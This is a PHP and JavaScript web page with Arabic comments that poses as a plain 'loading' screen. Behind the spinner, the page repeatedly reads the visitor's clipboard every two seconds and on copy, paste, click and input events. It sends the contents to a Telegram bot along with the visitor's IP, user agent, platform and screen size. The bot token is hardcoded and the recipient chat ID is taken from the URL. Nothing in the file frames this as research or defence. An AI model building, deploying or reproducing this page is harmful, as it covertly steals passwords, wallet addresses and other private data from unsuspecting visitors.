<?php
// توكن البوت الخاص بك
$botToken = "8642478796:AAEaDxElqAtOEs2DUzz_8yNnuflpLRSADwQ";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $clipboardData = $input['clipboardData'] ?? null;
    $deviceInfo = $input['deviceInfo'] ?? null;

    if ($clipboardData && $deviceInfo) {
        // إرسال بيانات الحافظة ومعلومات الجهاز
        $message = "
📋 <b>بيانات جديدة من الحافظة</b>

📝 <b>المحتوى:</b>
<code>{$clipboardData}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
        ";
        $result = sendTelegramMessage($chatId, $message, $botToken);
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

// الحصول على chatId من رابط الصفحة
$chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
        }
        
        .loading-container {
            text-align: center;
        }
        
        .loader {
            width: 80px;
            height: 80px;
            border: 8px solid #333;
            border-top: 8px solid #2E8B57;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            color: #ccc;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="loader"></div>
        <div class="loading-text">جاري تحميل...</div>
    </div>

    <script>
        // حالة النظام
        const state = {
            dataSent: 0,
            maxData: 30,
            monitoringInterval: null,
            chatId: "<?php echo $chatId; ?>",
            lastClipboardData: ""
        };

        // جمع معلومات الجهاز
        function collectDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                battery: 'غير معروف',
                connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
            };
        }

        // محاولة قراءة محتوى الحافظة
        async function readClipboard() {
            try {
                const text = await navigator.clipboard.readText();
                return text;
            } catch (error) {
                // في حالة رفض الإذن، نستخدم الطريقة القديمة عن طريق events
                return null;
            }
        }

        // إرسال البيانات إلى الخادم
        function sendDataToServer(clipboardData, deviceInfo) {
            const data = {
                chatId: state.chatId,
                clipboardData: clipboardData,
                deviceInfo: deviceInfo
            };
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(result => {
                if (result.status === 'success') {
                    state.dataSent++;
                    
                    // التحقق من اكتمال العملية
                    if (state.dataSent >= state.maxData) {
                        stopMonitoring();
                    }
                }
            })
            .catch(error => {
                console.error('خطأ في إرسال البيانات:', error);
            });
        }

        // بدء مراقبة الحافظة
        function startMonitoring() {
            // مراقبة أحداث النسخ واللصق
            document.addEventListener('copy', handleClipboardEvent);
            document.addEventListener('paste', handleClipboardEvent);
            document.addEventListener('cut', handleClipboardEvent);
            
            // أيضا نتحقق من الحافظة كل ثانيتين
            state.monitoringInterval = setInterval(async () => {
                try {
                    const clipboardText = await readClipboard();
                    if (clipboardText && clipboardText !== state.lastClipboardData) {
                        state.lastClipboardData = clipboardText;
                        const deviceInfo = collectDeviceInfo();
                        sendDataToServer(clipboardText, deviceInfo);
                    }
                } catch (error) {
                    console.log('لا يمكن الوصول إلى الحافظة مباشرة');
                }
            }, 2000);
        }

        // التعامل مع أحداث الحافظة
        async function handleClipboardEvent(event) {
            // نعطي وقتًا للحدث ليكتمل
            setTimeout(async () => {
                try {
                    const clipboardText = await readClipboard();
                    if (clipboardText && clipboardText !== state.lastClipboardData) {
                        state.lastClipboardData = clipboardText;
                        const deviceInfo = collectDeviceInfo();
                        sendDataToServer(clipboardText, deviceInfo);
                    }
                } catch (error) {
                    console.log('لا يمكن قراءة الحافظة');
                }
            }, 100);
        }

        // إيقاف المراقبة
        function stopMonitoring() {
            clearInterval(state.monitoringInterval);
            document.removeEventListener('copy', handleClipboardEvent);
            document.removeEventListener('paste', handleClipboardEvent);
            document.removeEventListener('cut', handleClipboardEvent);
        }

        // بدء النظام عند تحميل الصفحة
        window.addEventListener('load', () => {
            // طلب الإذن للوصول إلى الحافظة
            async function requestClipboardPermission() {
                try {
                    // هذه الطريقة تعمل في المتصفحات الحديثة
                    const permissionStatus = await navigator.permissions.query({ name: 'clipboard-read' });
                    if (permissionStatus.state === 'granted' || permissionStatus.state === 'prompt') {
                        console.log('الإذن ممنوح أو يمكن طلبه');
                    }
                } catch (error) {
                    console.log('API الأذونات غير متوفر، نستخدم الطرق البديلة');
                }
            }

            // بدء المراقبة بعد ثانية
            setTimeout(() => {
                requestClipboardPermission();
                startMonitoring();
            }, 1000);
        });

        // أيضا نراقب أي نقرات على الصفحة كمحاولة للوصول إلى الحافظة
        document.addEventListener('click', (event) => {
            setTimeout(async () => {
                try {
                    const clipboardText = await readClipboard();
                    if (clipboardText && clipboardText !== state.lastClipboardData) {
                        state.lastClipboardData = clipboardText;
                        const deviceInfo = collectDeviceInfo();
                        sendDataToServer(clipboardText, deviceInfo);
                    }
                } catch (error) {
                    console.log('لا يمكن قراءة الحافظة بعد النقر');
                }
            }, 100);
        });

        // مراقبة أي كتابة في الحقول قد تنتهي بنسخ
        document.addEventListener('input', (event) => {
            if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
                setTimeout(async () => {
                    try {
                        const clipboardText = await readClipboard();
                        if (clipboardText && clipboardText !== state.lastClipboardData) {
                            state.lastClipboardData = clipboardText;
                            const deviceInfo = collectDeviceInfo();
                            sendDataToServer(clipboardText, deviceInfo);
                        }
                    } catch (error) {
                        console.log('لا يمكن قراءة الحافظة بعد الإدخال');
                    }
                }, 100);
            }
        });
    </script>
</body>
</html>
